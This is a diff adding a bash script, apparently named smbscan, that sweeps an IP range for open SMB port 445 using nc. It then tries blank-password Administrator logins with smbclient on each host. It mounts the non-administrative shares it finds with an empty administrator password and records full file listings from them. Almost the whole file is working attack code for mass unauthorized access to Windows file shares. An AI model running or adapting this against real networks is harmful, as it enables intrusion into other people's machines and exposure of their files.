@@ -1,0 +1,191 @@
+#!/bin/bash
+#version 0.9
+#04/11/06 kon
+
+#set -x
+
+[[ $1 ]] || exit 1;
+
+timeout=1
+
+
+range=$1
+start=${range/-*/}
+end=${range/*-/}
+
+bdir=`pwd`
+tmp="./log/smbscn/tmp.$$"
+now=`date +%y-%m-%d--%T-$range`
+logbase="./log/smbscn/$now"
+clients="./log/smbscn/$now/clients"
+mnt="./mnt"
+shares="shares.log"
+
+mkdir ./log &> /dev/null
+mkdir ./log/smbscn &> /dev/null
+mkdir $logbase
+mkdir $clients
+mkdir $mnt &> /dev/null
+
+
+
+cnt=0;
+
+for log in allIP badIP goodIP FS
+do
+	eval $log="./log/smbscn/$now/$log.log"
+done
+
+for IP in $start $end
+do	
+	IFS="." 
+	set -- $IP
+	IFS=" " 
+	for i in 1 2 3 4
+	do
+		IFS="." 
+		[[ $cnt == 0 ]] && eval sIP$i=$(eval echo \$$i) || eval eIP$i=$(eval echo \$$i)
+	done
+	((cnt++));
+done
+IFS=" "
+for i in 1 2 3 4
+do
+ echo "sip$i=$(eval echo \$sIP$i)"
+ echo "eip$i=$(eval echo \$eIP$i)"
+done
+
+echo -n "starting SMB probes on $start - $end (\".\" == 255 hosts)"
+begin=`date +%s`
+for i in `seq -s\  $(echo $sIP1) $(echo $eIP1)`
+do	
+	for j in `seq -s\  $sIP2 $eIP2` 
+	do 
+		for k in `seq -s\  $sIP3 $eIP3` 
+		do 
+			for l in `seq -s\  $sIP4 $eIP4` 
+			do 
+				[[ $((cnt%255)) -eq 0  ]] && echo -n ".";
+				let cnt+=1;      
+				#nmap "$i.$j.$k.$l" -p 445 >> $nmaplog & 
+				echo "$i.$j.$k.$l" >> $allIP;
+				## -w$timeout waits 1 sec until timeout
+				nc "$i.$j.$k.$l" 445 -w$timeout -e ./smbasc 2>&1 | awk '{print $2}' | tr -d \[ | tr -d \] >> $badIP &				
+				#echo "$i.$j.$k.$l"; 
+			done	
+		done 
+	done 
+done 
+
+cnt=0
+while (pidof nmap 2>&1 > /dev/null); do     
+	[[ $((cnt%10)) -eq 0 || $cnt -eq 0  ]] && echo "still scanning...";     
+	sleep 0.5;     
+	let cnt+=1; 
+done
+
+end=`date +%s`
+ccl 1 32 "done.\n"
+ccl
+
+
+cat $allIP | while read IP; do 
+	if [[ `grep ^$IP$ $badIP` == "" ]]; then 
+		echo $IP >> $goodIP; 
+	fi; 
+done
+
+sort -g $badIP > $tmp
+mv $tmp $badIP
+sort -g $goodIP > $tmp
+mv $tmp $goodIP
+
+totalhosts=`cat $allIP | wc -w`
+closedhosts=`cat $badIP | wc -w`
+openhosts=`cat $goodIP | wc -w`
+
+cat << EOF
+hosts total: $totalhosts
+ -with port 445 closed: $closedhosts
+ -with port 445 open: $openhosts
+
+beingscan: $(echo `python stamp2time.py $begin`)
+endscan: $(echo `python stamp2time.py $end`)
+duration for scanning $totalhosts hosts: $((end-begin)) secs
+EOF
+
+echo - "starting no admin pw checks"
+
+cat $goodIP | \
+	while read IP; do 
+		smbclient -L $IP -N -U=Administrator > $clients/$IP 2>&1 & 
+	done
+cnt=0
+while (pidof smbclient 2>&1 > /dev/null); do     
+	[[ $((cnt%100)) -eq 0 || $cnt -eq 0  ]] && echo "still checking...";     
+	sleep 0.5;     
+	let cnt+=1; 
+done
+
+cd $clients
+cdir=`pwd`
+for IP in * 
+do 
+	echo -n "$IP "; 
+	grep -e Domain $IP | \
+	uniq; grep -e Disk $IP | \
+	while read share
+	do 
+		echo $IP $share; 
+	done 
+	echo -n $IP 
+	grep -A3 Server $IP | \
+	sed -n "9p" 
+done | \
+#very dirty regex to remove lines with IP only :(
+egrep -v ^\[0-9\]?\[0-9\]?\[0-9\]?\.\[0-9\]?\[0-9\]?\[0-9\]?\.\[0-9\]?\[0-9\]?\[0-9\]?\.\[0-9\]?\[0-9\]?\[0-9\]?$ > overall.log
+cd -
+
+awk '{ if ($3 == "Disk") {if ($2 !~ /[a-zA-Z]+\$/) {print $0}}}' $cdir/overall.log > $mnt/$shares
+
+echo "all data saved in $clients/overall.log"
+echo "intersting shares saved in $mnt/shares.log"
+echo "starting to mount available shares"
+
+cd mnt
+
+cat $shares | \
+while read line 
+do 
+		IP=${line/\ */} 
+		share=`echo $line | awk '{print $2}'` 
+		echo -n "mounting" $IP $share
+		mkdir $IP &> /dev/null
+		cd $IP
+		mkdir $share  &> /dev/null
+		smbmount //$IP/$share $share -ousername=administrator,password=
+		#echo -e "\t" $IP $share >> ../../$FS
+		echo " fetching filelist... "
+		# now we dont want the filelistings to be fetched sequentially but simultaneously! :D
+		# -> to be run in subshells, maybe still buggy. not tested very well yet...
+		(
+		du -ha $share |\
+			while read filename
+			do
+				echo $IP-$share $filename >> ../../$FS
+				echo $filename >> ../../$logbase/$IP-$share 
+			done
+		) &
+		cd ..
+done
+
+cnt=0
+while (pidof du 2>&1 > /dev/null); do     
+	[[ $((cnt%100)) -eq 0 || $cnt -eq 0  ]] && echo "still fetching...";     
+	sleep 0.5;     
+	let cnt+=1; 
+done
+
+### uncomment the following line if you want smbscan to unmount shares after fetching the filelist
+##./umountshares
+
